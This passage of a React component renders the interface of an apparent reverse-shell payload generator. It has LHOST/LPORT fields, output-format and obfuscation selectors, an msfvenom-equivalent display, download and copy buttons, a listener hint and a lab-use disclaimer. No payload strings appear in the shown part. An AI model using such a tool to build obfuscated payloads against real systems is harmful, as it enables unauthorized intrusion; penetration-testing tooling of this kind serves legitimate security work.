                      <span className="text-[8px] px-1.5 py-0.5 rounded-full bg-amber-500/10 border border-amber-500/20 text-amber-400 flex items-center gap-1">
                        <AlertCircle size={8} /> Template
                      </span>
                    )}
                  </div>
                  {msfvenomCmd && (
                    <div className="mt-2 p-2 rounded-lg bg-black/50 border border-white/5">
                      <div className="text-[10px] text-amber-400/80 font-mono mb-1 flex items-center gap-1">
                        <Code size={10} /> msfvenom equivalent
                      </div>
                      <code className="text-[10px] text-white/50 break-all block font-mono">{msfvenomCmd}</code>
                      <button
                        type="button"
                        onClick={() => copyToClipboard(msfvenomCmd)}
                        className="mt-1 text-[10px] text-cyan-400/80 hover:text-cyan-300 transition-colors"
                      >
                        Copy msfvenom
                      </button>
                    </div>
                  )}
                </div>

                <div className="grid grid-cols-2 gap-3 mb-4">
                  <div>
                    <label className="text-[10px] text-white/40 block mb-1 font-medium">LHOST</label>
                    <input
                      type="text"
                      value={lhost}
                      onChange={(e) => handleLhostChange(e.target.value)}
                      disabled={!currentPayloadInfo.requiresLhost}
                      placeholder={currentPayloadInfo.requiresLhost ? "10.10.14.5" : "Not required"}
                      className={`${inputClass} disabled:opacity-40`}
                    />
                    {lhostError && <div className="text-[10px] text-red-400 mt-1">{lhostError}</div>}
                  </div>
                  <div>
                    <label className="text-[10px] text-white/40 block mb-1 font-medium">LPORT</label>
                    <input
                      type="number"
                      min="1"
                      max="65535"
                      value={lport}
                      onChange={(e) => handleLportChange(e.target.value)}
                      disabled={!currentPayloadInfo.requiresLport}
                      placeholder={currentPayloadInfo.requiresLport ? "4444" : "Not required"}
                      className={`${inputClass} disabled:opacity-40`}
                    />
                    {lportError && <div className="text-[10px] text-red-400 mt-1">{lportError}</div>}
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="text-[10px] text-white/40 block mb-1 font-medium">Output Format</label>
                    <select
                      value={format}
                      onChange={(e) => setFormat(e.target.value as OutputFormat)}
                      className={selectClass}
                    >
                      {currentPayloadInfo.supportedFormats.map(f => (
                        <option key={f} value={f} style={{ background: '#0d1022' }}>{f}</option>
                      ))}
                    </select>
                  </div>
                  <div>
                    <label className="text-[10px] text-white/40 block mb-1 font-medium">Obfuscation</label>
                    <select
                      value={obfuscation}
                      onChange={(e) => setObfuscation(e.target.value as ObfuscationLevel)}
                      className={selectClass}
                    >
                      <option value="none" style={{ background: '#0d1022' }}>None</option>
                      <option value="light" style={{ background: '#0d1022' }}>Light</option>
                      <option value="medium" style={{ background: '#0d1022' }}>Medium</option>
                      <option value="heavy" style={{ background: '#0d1022' }}>Heavy</option>
                    </select>
                    {obfuscation !== 'none' && !OBFUSCATION_SUPPORTED_FORMATS.includes(format) && (
                      <div className="text-[10px] text-amber-400 mt-1 flex items-center gap-1">
                        <AlertCircle size={10} /> Obfuscation not supported for {format}
                      </div>
                    )}
                  </div>
                </div>
              </div>

              <div className="flex items-center justify-between gap-2">
                <label className="flex items-center gap-2 text-[11px] text-white/45 cursor-pointer select-none">
                  <input
                    type="checkbox"
                    checked={autoGenerate}
                    onChange={e => setAutoGenerate(e.target.checked)}
                    className="rounded border-white/20 accent-red-500"
                  />
                  Auto-generate on change
                </label>
                <button
                  onClick={generate}
                  className="px-6 py-2.5 rounded-xl font-bold text-white text-sm flex items-center gap-2 transition-all hover:scale-[1.02] active:scale-[0.98] shadow-lg shadow-red-500/20"
                  style={{ background: 'linear-gradient(135deg, #dc2626, #b91c1c)' }}
                >
                  <Zap size={14} /> Generate
                </button>
              </div>

              <p className="text-[10px] text-white/30 text-center leading-relaxed">
                ⚠️ Output is for isolated labs / authorized tests only. Unauthorized use is illegal.
              </p>

              {history.length > 0 && (
                <div className="bg-white/5 border border-white/5 rounded-2xl p-4">
                  <div className="text-[10px] uppercase tracking-wider text-white/30 font-semibold mb-2 flex items-center gap-1.5">
                    <Clock size={10} /> Recent generations
                  </div>
                  <div className="space-y-1.5 max-h-40 overflow-y-auto custom-scrollbar">
                    {history.map(h => (
                      <button
                        key={h.id}
                        type="button"
                        onClick={() => {
                          setSelectedPayload(h.type);
                          setFormat(h.format);
                          setLhost(h.lhost);
                          setLport(h.lport);
                          setActiveTab('generator');
                        }}
                        className="w-full text-left px-2.5 py-2 rounded-lg bg-black/30 border border-white/5 hover:border-red-500/25 transition-colors"
                      >
                        <div className="flex justify-between gap-2 text-[11px]">
                          <span className="text-white/70 font-medium truncate">{h.type}</span>
                          <span className="text-white/30 font-mono">{h.format}</span>
                        </div>
                        <div className="text-[10px] text-white/35 font-mono truncate mt-0.5">{h.lhost}:{h.lport} · {h.snippet}</div>
                      </button>
                    ))}
                  </div>
                </div>
              )}
            </div>

            <div className="xl:col-span-7">
              <div className="bg-white/5 border border-white/5 rounded-2xl p-5 h-full flex flex-col shadow-lg shadow-black/20">
                <div className="flex justify-between items-center mb-3 flex-wrap gap-2">
                  <h3 className="text-sm font-semibold text-white flex items-center gap-2">
                    <Code size={14} className="text-red-400" /> Generated Payload
                  </h3>
                  {generatedPayload && (
                    <div className="flex gap-2 flex-wrap">
                      <button onClick={() => setShowRaw(!showRaw)} className="text-[10px] px-2 py-1 rounded-xl border border-white/10 text-white/40 hover:text-white/80 transition-colors flex items-center gap-1">
                        {showRaw ? <EyeOff size={12} /> : <Eye size={12} />} {showRaw ? 'Formatted' : 'Raw'}
                      </button>
                      <button onClick={() => copyToClipboard(generatedPayload)} className="text-[10px] px-2 py-1 rounded-xl border border-white/10 text-white/40 hover:text-white/80 transition-colors flex items-center gap-1">
                        {copyStatus === 'success' ? <><CheckCircle size={12} className="text-emerald-400" /> Copied!</> :
                          copyStatus === 'error' ? <><AlertCircle size={12} className="text-red-400" /> Failed</> :
                            copyStatus === 'manual' ? <><Copy size={12} /> Select</> :
                              <><Copy size={12} /> Copy</>}
                      </button>
                      <button onClick={downloadPayload} className="text-[10px] px-2 py-1 rounded-xl bg-red-500/10 text-red-400 hover:bg-red-500/20 border border-red-500/20 transition-colors flex items-center gap-1">
                        <Download size={12} /> Download
                      </button>
                    </div>
                  )}
                </div>

                <div className="flex-1 bg-black/50 rounded-xl p-3 overflow-auto font-mono text-xs border border-white/5 min-h-[280px] max-h-[500px]">
                  {generatedPayload ? (
                    <pre className="whitespace-pre-wrap break-all text-emerald-400/90 leading-relaxed">
                      {showRaw ? generatedPayload : generatedPayload
                        .split('\n')
                        .map((line, i) => <div key={i} className="leading-relaxed break-all">{line || '\u00A0'}</div>)}
                    </pre>
                  ) : (
                    <div className="h-full flex items-center justify-center text-center text-white/30">
                      <div>
                        <Swords size={40} className="mx-auto mb-3 opacity-30" />
                        <p className="text-sm">Configure a payload and generate</p>
                        <p className="text-[11px] text-white/20 mt-1">Lab use only</p>
                      </div>
                    </div>
                  )}
                </div>

                {generatedPayload && (
                  <div className="mt-3 p-3 bg-black/40 border border-white/5 rounded-xl text-xs">
                    <div className="font-semibold text-red-400 mb-1.5 flex items-center gap-1.5">
                      <Lightbulb size={12} /> Quick Usage Guide
                    </div>
                    <p className="text-white/50">{currentPayloadInfo.howToUse}</p>
                    <div className="mt-1.5 text-[10px] text-white/40">
                      <span className="text-white">Listener:</span> <code className="bg-black/40 px-1.5 py-0.5 rounded text-emerald-400 font-mono">{substituteListener(currentPayloadInfo.commonListenerCommand, lhost, lport)}</code>
                    </div>
                    <div className="mt-1.5 grid grid-cols-2 gap-2 text-[10px]">
                      <div className="border border-emerald-500/20 rounded p-1.5 bg-emerald-500/5">
                        <div className="text-emerald-400 font-mono text-[9px] flex items-center gap-1"><CheckCircle size={10} /> PROS</div>
                        <ul className="list-disc list-inside text-white/40 mt-0.5 space-y-0.5 text-[10px]">
                          {currentPayloadInfo.pros.slice(0, 2).map((p, i) => <li key={i}>{p}</li>)}
                        </ul>
                      </div>
                      <div className="border border-red-500/20 rounded p-1.5 bg-red-500/5">
                        <div className="text-red-400 font-mono text-[9px] flex items-center gap-1"><AlertCircle size={10} /> CONS</div>
                        <ul className="list-disc list-inside text-white/40 mt-0.5 space-y-0.5 text-[10px]">
                          {currentPayloadInfo.cons.slice(0, 2).map((c, i) => <li key={i}>{c}</li>)}
                        </ul>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Manual Copy Modal */}
      {copyStatus === 'manual' && (
        <div className="fixed inset-0 bg-black/80 z-50 flex items-center justify-center p-4" onClick={() => setCopyStatus('idle')}>
          <div className="bg-[#0d1022] border border-white/10 rounded-2xl p-6 max-w-2xl w-full shadow-2xl" onClick={e => e.stopPropagation()}>
            <h3 className="text-lg font-bold text-white mb-2 flex items-center gap-2">
              <Copy size={18} className="text-cyan-400" /> Manual Copy Required
            </h3>
            <p className="text-sm text-white/40 mb-3">
              Tap "Select All" below, then press <kbd className="bg-white/10 px-1.5 py-0.5 rounded text-white/60">Ctrl+C</kbd> or <kbd className="bg-white/10 px-1.5 py-0.5 rounded text-white/60">Cmd+C</kbd>.
            </p>
            <pre
              ref={manualCopyRef}
              className="w-full h-64 bg-black/50 border border-white/5 rounded-xl p-3 font-mono text-xs overflow-auto whitespace-pre-wrap break-all select-text text-emerald-400/90 leading-relaxed"
            >
              {generatedPayload}
            </pre>
            <div className="flex gap-2 mt-3">
              <button
                onClick={handleSelectAll}
                className="flex-1 py-2 bg-red-500/10 text-red-400 rounded-lg text-sm font-medium hover:bg-red-500/20 border border-red-500/20 transition-colors"
              >
                Select All
              </button>
              <button onClick={() => setCopyStatus('idle')} className="px-4 py-2 text-white/40 text-sm hover:text-white transition-colors">
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      <style dangerouslySetInnerHTML={{ __html: `
        .custom-scrollbar::-webkit-scrollbar { width: 3px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.08); border-radius: 10px; }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.15); }
        @keyframes slideDown {
          from { opacity: 0; transform: translateY(-8px); }
          to { opacity: 1; transform: translateY(0); }
        }
        .animate-slideDown { animation: slideDown 0.2s ease-out; }
        ::selection { background: rgba(239, 68, 68, 0.3); color: white; }
      `}} />
    </div>
  );
}